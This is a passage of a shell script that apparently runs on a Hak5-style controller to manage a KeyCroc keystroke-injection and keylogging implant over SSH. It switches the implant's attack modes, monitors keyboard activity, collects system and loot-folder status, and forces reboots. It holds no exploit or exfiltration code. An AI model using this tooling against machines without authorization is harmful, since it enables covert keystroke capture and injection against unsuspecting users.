		PROMPT "Keycroc Attackmode is now in $1"
	}

	while true; do
		resp=$(LIST_PICKER \
			"ATTACKMODE HID MENU" \
			"ATTACKMODE HID STORAGE" \
			"ATTACKMODE HID" \
			"RELOAD_PAYLOADS" \
			"ATTACKMODE OFF" \
			"ARMING_MODE" \
			"ATTACKMODE RO_STORGE" \
			"ATTACKMODE HID AUTO_ETHERNET" \
			"ATTACKMODE HID SERIAL" \
			"CHECK_KEYBOARD" \
			"KEYBOARD_MONITOR" \
			"CHECK_PAYLOADS" \
			"Exit" \
			"Main_menu" \
			"Main_menu"
		)

		case "$resp" in
			"ATTACKMODE HID STORAGE") run_attackmode "$resp" ;;
			"ATTACKMODE HID") run_attackmode "$resp" ;;
			"RELOAD_PAYLOADS") run_attackmode "$resp" ;;
			"ATTACKMODE OFF") run_attackmode "$resp" ;;
			"ARMING_MODE") run_attackmode "$resp" ;;
			"ATTACKMODE RO_STORGE") run_attackmode "$resp" ;;
			"ATTACKMODE HID AUTO_ETHERNET") run_attackmode "$resp" ;;
			"ATTACKMODE HID SERIAL") run_attackmode "$resp" ;;
			"CHECK_KEYBOARD")
				output=$(ssh_croc 'sh -lc '\''[ "$(KEYBOARD)" = PRESENT ] && echo "KEYBOARD PRESENT" || echo "KEYBOARD MISSING"'\''')
				LOG green "KEYCROC $output"
				PROMPT "KEYCROC $output"
			;;
			"KEYBOARD_MONITOR")
				keyboard_monitor() {
					LOG yellow "[KEYCROC] Keyboard ACTIVITY / INACTIVITY. Initiating activity..."
					LOG green "PRESS ANY BUTTON TO RETURN TO MENU"
					
					while true; do
						if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_INACTIVITY 1"' 2>/dev/null; then
							LOG red "KEYCROC KEYBOARD INACTIVE"
						fi

						if ssh_croc 'sh -lc "WAIT_FOR_KEYBOARD_ACTIVITY 0"' 2>/dev/null; then
							LOG blue "KEYCROC KEYBOARD ACTIVE"
						fi
					sleep 1
					done
				}
				keyboard_monitor &
				keyboard_monitor_pid=$!

				WAIT_FOR_INPUT
				kill -9 "$keyboard_monitor_pid" 2>/dev/null
				wait "$keyboard_monitor_pid" 2>/dev/null
			;;
			"CHECK_PAYLOADS")
				output=$(ssh_croc 'sh -lc "CHECK_PAYLOADS"')
				LOG blue "--------------------------------------"
				LOG "KEYCROC PAYLOADS $output"
				LOG green "PRESS A BUTTON TO RETURN TO MENU"
				WAIT_FOR_BUTTON_PRESS A
			;;
			"Main_menu")
				LOG yellow "Return to main menu"
				return
			;;
			"Exit")
				confirm=$(CONFIRMATION_DIALOG "Exit. ?") || return
				if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
					exit 0
				fi
			;;
		esac
	done
}

# Keycroc status
croc_status() {
	LOG ""
	LOG blue "================================================="
	LOG yellow "------------ KEYCROC STATUS ---------------------"
	LOG blue "================================================="
	LOG cyan "Checking KeyCroc connection..."

	if ! ssh_croc 'true' 2>/dev/null; then
		LOG red "STATUS: NOT CONNECTED"
		PROMPT "KeyCroc is not connected"
		return
	fi

	LOG green "STATUS: CONNECTED"
	spinnerid=$(START_SPINNER "Collecting system Information")

	keycroc_info=$(ssh_croc 'sh -lc '"'"'
		echo "===HOSTNAME==="
		cat /etc/hostname 2>/dev/null || echo "Unknown" ; echo

		echo "===OS==="
		cat /etc/os-release || echo "Unknown" ; echo

		echo "===KERNEL==="
		uname -r 2>/dev/null || echo "Unknown" ; echo

		echo "===ARCH==="
		uname -m 2>/dev/null || echo "Unknown" ; echo

		echo "===MACHINE==="
		uname -o 2>/dev/null || echo "Unknown" ; echo

		echo "===SHELL==="
		echo "$SHELL" 2>/dev/null || echo "Unknown" ; echo

		echo "===BOOT==="
		uptime -s 2>/dev/null || echo "Unknown" ; echo

		echo "===UPTIME==="
		uptime 2>/dev/null || echo "Unknown" ; echo

		echo "===LOAD==="
		cat /proc/loadavg 2>/dev/null | cut -d " " -f1-3 ; echo

		echo "===CPU==="
		grep -m1 -E "^(model name|Processor|cpu model|system type|machine)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//" ; echo

		echo "===CPU_CORES==="
		grep -c "^processor" /proc/cpuinfo 2>/dev/null ; echo

		echo "===CPU_MHZ==="
		grep -m1 -E "^(cpu MHz|BogoMIPS)[[:space:]]*:" /proc/cpuinfo 2>/dev/null | cut -d ":" -f2- | sed "s/^ *//" ; echo

		echo "===MEMORY==="
		awk "
			/MemTotal:/ {total=\$2}
			/MemFree:/  {free=\$2}
			/Buffers:/  {buffers=\$2}
			/^Cached:/  {cached=\$2}
			END {
				used = total - free - buffers - cached
				printf \"%d MB / %d MB\", used/1024, total/1024
			}
		" /proc/meminfo 2>/dev/null ; echo

		echo "===MEMORY_TOTAL==="
		awk "/MemTotal:/ {printf \"%d MB\", \$2/1024}" /proc/meminfo
		echo

		echo "===MEMORY_FREE==="
		awk "/MemFree:/ {printf \"%d MB\", \$2/1024}" /proc/meminfo
		echo

		echo "===STORAGE==="
		df -h / 2>/dev/null | tail -n 1 ; echo

		echo "===MOUNTS==="
		df -h 2>/dev/null | tail -n +2 ; echo

		echo "===IP==="
		ip -4 addr show 2>/dev/null |
		awk "/inet / {print \$2, \$NF}" ; echo

		echo "===ROUTE==="
		ip route show 2>/dev/null |
		awk "/default/ {print \$0; exit}" ; echo

		echo "===GATEWAY==="
		ip route show 2>/dev/null |
		awk "/default/ {print \$3; exit}" ; echo

		echo "===DNS==="
		cat /etc/resolv.conf 2>/dev/null |
		grep "^nameserver" |
		awk "{print \$2}" ; echo

		echo "===INTERFACES==="
		ip -br link show 2>/dev/null ||
		ip link show 2>/dev/null
		echo

		echo "===MACS==="
		for interface in /sys/class/net/*; do
			name=$(basename "$interface")
			mac=$(cat "$interface/address" 2>/dev/null)
			[ -n "$mac" ] && echo "$name : $mac"
		done
		echo

		echo "===KEYBOARD==="
		if [ "$(KEYBOARD)" = PRESENT ]; then
			echo "KEYBOARD PRESENT" ; echo
		else
			echo "KEYBOARD MISSING" ; echo
		fi

		echo "===PROCESS_COUNT==="
		ps w 2>/dev/null |
		tail -n +2 |
		wc -l ; echo

		echo "===PROCESSES==="
		ps w 2>/dev/null ; echo

		echo "===FILES==="
		for file in \
			/root/udisk/payloads \
			/root/udisk/tools \
			/root/udisk/loot \
			/root/udisk/config.txt \
			/root/udisk \
			/tmp \
			/var/log
		do
			if [ -d "$file" ]; then
				echo "[PRESENT] $file"
			fi
		done
		echo
		echo "__END__"
	'"'"'')

	if [ -z "$keycroc_info" ]; then
		STOP_SPINNER "$spinnerid"
		LOG red "KeyCroc information collection failed"
		PROMPT "KeyCroc information collection failed"
		return
	fi
	STOP_SPINNER "$spinnerid"
	PROMPT "KeyCroc status complete"

	LOG "$keycroc_info"

	LOG green "PRESS A BUTTON TO RETURN TO MENU"
	WAIT_FOR_BUTTON_PRESS A
}

# Main menu loop
while true; do
	# Test ssh connection to keycroc
	test_ssh

	resp=$(LIST_PICKER \
		"MAIN MENU-$ssh_test" \
		"Quack_Command" \
		"Ducky_Payload" \
		"keystrokes" \
		"Custom_commands" \
		"Attackmode_HID" \
		"Keycroc_status" \
		"Reboot_Keycroc" \
		"Exit" \
		"Exit"
	)

	case "$resp" in
		"Quack_Command")
			Quack_Command
		;;
		"Ducky_Payload")
			Ducky_Payload
		;;
		"keystrokes")
			keystrokes
		;;
		"Custom_commands")
			Custom_commands
		;;
		"Attackmode_HID")
			Attackmode_HID
		;;
		"Keycroc_status")
			croc_status
		;;
		"Reboot_Keycroc")
			confirm=$(CONFIRMATION_DIALOG "REBOOT KEYCROC. ?") || return
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				# Reboot keycroc
				ssh_croc 'sh -lc "reboot --force"' &
				reboot_pid=$!
				sleep 2

				# Kill ssh session
				LOG red "[PAGER] Terminating SSH session..."

				kill -9 "reboot_pid=$!" 2>/dev/null
				ps w | grep '[s]sh -o StrictHostKeyChecking=no' |
				while read -r pid rest; do
					kill -9 "$pid" 2>/dev/null
				done

				LOG red "[KEYCROC] is now rebooting"
				PROMPT "[KEYCROC] is now rebooting"
			fi
		;;
		"Exit")
			confirm=$(CONFIRMATION_DIALOG "Exit. ?") || exit 0
			if [[ "$confirm" == "$DUCKYSCRIPT_USER_CONFIRMED" ]]; then
				exit 0
			fi
		;;
	esac
done
